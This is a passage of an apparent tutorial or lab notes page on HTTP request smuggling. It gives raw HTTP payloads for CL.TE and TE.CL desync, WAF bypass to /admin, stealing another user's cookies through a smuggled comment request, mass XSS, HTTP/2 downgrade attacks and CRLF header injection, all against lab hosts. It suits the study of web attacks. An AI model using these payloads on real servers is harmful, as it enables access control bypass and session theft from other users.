+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">405</span> <span style="color:#a6e22e">Not Allowed</span></span></span></code></pre></div><h2 id="exploitation-1">Exploitation<a class="anchor" href="#exploitation-1">#</a></h2>
+<p>Guess what, we do the same thing as <code>CL.TE</code>, but with a leading space on <code>TE</code> header, since that worked</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">35</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">Transfer-Encoding: chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /admin.php?parameter=value HTTP/1.1
+</span></span><span style="display:flex;"><span>Dummy: </span></span></code></pre></div><h1 id="tecl"><code>TE.CL</code><a class="anchor" href="#tecl">#</a></h1>
+<p>In this example, both supports <code>TE</code>. However, the web server does not act according to the specification, so we can make it fall back to <code>CL</code>, and the other one use <code>TE </code>
+Basically reverse of the above. However, if web server doesn&rsquo;t support <code>TE</code>, reverse proxy does, then we don&rsquo;t have to obfuscate the <code>TE</code> header</p>
+<p>We can exploit this to bypass WAF.</p>
+<p><strong>Before exploiting this, we need to change a few settings in burp.</strong></p>
+<p>First, send 2 requests to <strong>repeater</strong> tab, right click on <strong>settings</strong> near <strong>send</strong> button, uncheck <strong>Update Content-Length</strong></p>
+<p><img src="/images/065b2ef2b215843b5ff4153009ef8a6d.png" alt="" /></p>
+<p>Then, add the 2 tabs together into a group. <strong>Right click one tab</strong> and <strong>Add tab to group</strong> -&gt; <strong>New tab group</strong></p>
+<p><img src="/images/f997e3ca01224d2edb6bb8ad435f86af.png" alt="" /></p>
+<p>Finally, click on <strong>down arrow</strong> near <strong>send</strong> button, then choose <strong>Send group in sequence (single connection)</strong></p>
+<p><img src="/images/a110a8a61bba00e58cf88872a391fddf.png" alt="" /></p>
+<p>This way, burp won&rsquo;t auto adjust the <code>Content-Length</code> header, and we send 2 request using a single TCP socket.</p>
+<h2 id="discovery-2">Discovery<a class="anchor" href="#discovery-2">#</a></h2>
+<p>On tab 1, we send this request. There are 2 CRLF sequence after <code>0</code>: <code>\r\n\r\n</code>.</p>
+<p>The <code>Transfer-Encoding: asdchunked</code> header is because the webapp will invalidate this and fall back to <code>Content-Length</code>, making it a <code>TE.CL</code> attack</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">asdchunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>5
+</span></span><span style="display:flex;"><span>HELLO
+</span></span><span style="display:flex;"><span>0</span></span></code></pre></div><p>On second tab, we send this request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><h2 id="hold-up-wait-a-minute">Hold up, wait a minute<a class="anchor" href="#hold-up-wait-a-minute">#</a></h2>
+<p>Let&rsquo;s unpack this. This is what the reverse proxy sees. It sees exactly as how we send it:</p>
+<ul>
+<li>Request 1:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">asdchunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>5
+</span></span><span style="display:flex;"><span>HELLO
+</span></span><span style="display:flex;"><span>0</span></span></code></pre></div><ul>
+<li>Request 2:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>And this is what the web server sees:</p>
+<ul>
+<li>Request 1:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">asdchunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>5</span></span></code></pre></div><ul>
+<li>Request 2:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HELLO
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>The 2 requests should obviously returns <code>404</code> for both pages.</p>
+<p>However, we got a <code>404</code> and <code>400</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">404</span> <span style="color:#a6e22e">NOT FOUND</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">400</span> <span style="color:#a6e22e">Bad Request</span></span></span></code></pre></div><p>This is because the second request that the server sees does not fit into any standard, it is not the right syntax. We have proven that there is a desync between the reverse proxy and the web server</p>
+<h2 id="exploitation-2">Exploitation<a class="anchor" href="#exploitation-2">#</a></h2>
+<p>We send this as first request. The body contains a request to a page or a payload that the WAF normally blocks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">asdchunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>32
+</span></span><span style="display:flex;"><span>GET /admin HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 83.136.251.11:59501
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0</span></span></code></pre></div><p>And this as our second request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /doesnotexist <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div><p>We should get a <code>404</code> on the first request, and successfully get to <code>/admin</code> with second request. The third response goes to the abyss, reduced to atoms</p>
+<h1 id="stealing-cookie">Stealing Cookie<a class="anchor" href="#stealing-cookie">#</a></h1>
+<p>Imagine a webapp that has a comment page, and you can put anything in the comment, including CRLF sequence and is vulnerable to desync</p>
+<p>We exploit it by sending this <code>CL.TE</code> attack. Notice the <code>Content-Length</code> of the smuggled request is 300. When someone authenticated access the site, they will complete this request and post their own HTTP headers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">stealingdata.htb</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=asdasdasd</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">181</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST /comments.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: stealingdata.htb
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Cookie: session=asdasdasd
+</span></span><span style="display:flex;"><span>Content-Length: 300
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name=hacker&amp;comment=test</span></span></code></pre></div><h1 id="xss">XSS<a class="anchor" href="#xss">#</a></h1>
+<p>If the webapp reflects value in a header with no sanitizing, normally, it is inexploitable since we can&rsquo;t make a legit user to send a custom HTTP header.</p>
+<p>However, if the website is vulnerable to request smuggling, we can do mass XSS targeting random people.</p>
+<p>Here&rsquo;s an <code>CL.TE</code> example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">vuln.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>Vuln: &#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span><span style="display:flex;"><span>Dummy: </span></span></code></pre></div><h1 id="http-2-downgrading">HTTP 2 downgrading<a class="anchor" href="#http-2-downgrading">#</a></h1>
+<h2 id="overview-1">Overview<a class="anchor" href="#overview-1">#</a></h2>
+<blockquote class='book-hint '>
+<p>Sometimes, we have websites that has a reverse proxy that talks in HTTP/2, then rewrite the request back to web server in HTTP/1.1.
+This is how we can exploit HTTP/2 downgrade. Otherwise, HTTP/2 is immune to request smuggling since it knows how to calculate body length</p>
+</blockquote><p>This is how a HTTP/1.1 request looks like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span></span></span></code></pre></div><p>This is how it looks like in HTTP/2. It is represented using so-called <code>pseudo-headers</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:method GET
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:path /index.php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:authority http2.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:scheme http</span></span></span></code></pre></div><p>You can see all the pseudo-headers and headers in <strong>Burp Inspector</strong></p>
+<p><img src="/images/b624b7fbabc7624d7fc8b2813e281ec4.png" alt="" /></p>
+<h2 id="h2cl"><code>H2.CL</code><a class="anchor" href="#h2cl">#</a></h2>
+<p>According to the <a href="https://datatracker.ietf.org/doc/html/rfc7540">HTTP/2 RFC</a>, the CL header is allowed if it&rsquo;s correct. If the reverse proxy does not validate <code>content-length</code> header, we got this vulnerability</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>A request or response that includes a payload body can include a content-length header field. 
+</span></span><span style="display:flex;"><span>A request or response is also malformed if the value of a content-length header field 
+</span></span><span style="display:flex;"><span>does not equal the sum of the DATA frame payload lengths that form the body.</span></span></code></pre></div><p>We send this request to reverse proxy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:method POST
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:path /
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:authority http2.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:scheme http
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">content-length 0
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /smuggled <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span></span></span></code></pre></div><p>If reverse proxy does not validate <code>content-length</code> header, it will rewrite the request like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /smuggled HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: http2.htb</span></span></code></pre></div><h2 id="h2te"><code>H2.TE</code><a class="anchor" href="#h2te">#</a></h2>
+<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc7540">HTTP/2 RFC</a>, <code>TE</code> header is a no no. However, if the reverse proxy don&rsquo;t remove it and just pass it to the web server, we got a vulnerability</p>
+<pre tabindex="0"><code>The &#34;chunked&#34; transfer encoding defined in [Section 4.1 of [RFC7230]] MUST NOT be used in HTTP/2.</code></pre><p>We send this request to reverse proxy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:method POST
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:path /
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:authority http2.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:scheme http
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">transfer-encoding chunked
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /smuggled <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span></span></span></code></pre></div><p>If the reverse proxy pass the <code>TE</code> header, it will rewrite the request like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /smuggled HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: http2.htb</span></span></code></pre></div><h2 id="injections">Injections<a class="anchor" href="#injections">#</a></h2>
+<p>HTTP/2 is a binary protocol.  In HTTP/2, the headers allows arbitrary characters to be contained in the headers, at least in theory. In practice, the HTTP/2 RFC defines the following restrictions in section <a href="https://datatracker.ietf.org/doc/html/rfc9113#section-8.2.1">8.2.1</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Failure to validate fields can be exploited for request smuggling attacks. 
+</span></span><span style="display:flex;"><span>In particular, unvalidated fields might enable attacks when messages are forwarded using HTTP/1.1, 
+</span></span><span style="display:flex;"><span>where characters such as carriage return (CR), line feed (LF), and COLON are used as delimiters. 
+</span></span><span style="display:flex;"><span>Implementations MUST perform the following minimal validation of field names and values:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- A field name MUST NOT contain characters in the ranges 0x00-0x20, 0x41-0x5a, or 0x7f-0xff (all ranges inclusive). This specifically excludes all non-visible ASCII characters, ASCII SP (0x20), and uppercase characters (&#39;A&#39; to &#39;Z&#39;, ASCII 0x41 to 0x5a).
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- With the exception of pseudo-header fields, which have a name that starts with a single colon, field names MUST NOT include a colon (ASCII COLON, 0x3a).
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- A field value MUST NOT contain the zero value (ASCII NUL, 0x00), line feed (ASCII LF, 0x0a), or carriage return (ASCII CR, 0x0d) at any position.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- A field value MUST NOT start or end with an ASCII whitespace character (ASCII SP or HTAB, 0x20 or 0x09).
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A request or response that contains a field that violates any of these conditions MUST be treated as malformed. 
+</span></span><span style="display:flex;"><span>In particular, an intermediary that does not process fields when forwarding messages MUST NOT 
+</span></span><span style="display:flex;"><span>forward fields that contain any of the values that are listed as prohibited above.</span></span></code></pre></div><p>In particular, according to the standard, implementations should reject requests containing special characters, such as CR, LF, and <code>:</code> in HTTP headers. If a reverse proxy does not implement this correctly, we can exploit request smuggling by creating an <code>H2.TE</code> vulnerability.</p>
+<h3 id="request-header-injection">Request Header Injection<a class="anchor" href="#request-header-injection">#</a></h3>
+<p>We send this request to the reverse proxy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:method POST
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:path /
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:authority http2.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:scheme http
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">dummy asd\r\nTransfer-Encoding: chunked
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /smuggled <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span></span></span></code></pre></div><p>If the reverse proxy does not check for CRLF characters in HTTP/2 header <strong>values</strong> before rewriting the request to HTTP/1.1, it will rewrite the request like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span>
+</span></span><span style="display:flex;"><span>Dummy<span style="color:#f92672">:</span> <span style="color:#ae81ff">asd</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /smuggled HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: http2.htb</span></span></code></pre></div><h3 id="header-name-injection">Header Name Injection<a class="anchor" href="#header-name-injection">#</a></h3>
+<p>We send this request to the reverse proxy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:method POST
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:path /
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:authority http2.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:scheme http
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">dummy: asd\r\nTransfer-Encoding chunked
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /smuggled <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span></span></span></code></pre></div><p>If the reverse proxy does not check for CRLF characters in HTTP/2 header <strong>names</strong> before rewriting the request to HTTP/1.1, it will rewrite the request like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span>
+</span></span><span style="display:flex;"><span>Dummy<span style="color:#f92672">:</span> <span style="color:#ae81ff">asd</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET /smuggled HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: http2.htb</span></span></code></pre></div><h3 id="request-line-injection">Request Line Injection<a class="anchor" href="#request-line-injection">#</a></h3>
+<p>We send this request to the reverse proxy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:path /
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:authority http2.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">:scheme http
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /smuggled <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">http2.htb</span></span></span></code></pre></div><p>If the reverse proxy does not check for CRLF characters in HTTP/2 <strong>pseudo-headers</strong> before rewriting the request to HTTP/1.1, it will rewrite the request like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">chunked</span>
+</span></span><span style="display:flex;"><span>Dummy<span style="color:#f92672">:</span> <span style="color:#ae81ff">asd / HTTP/1.1</span>
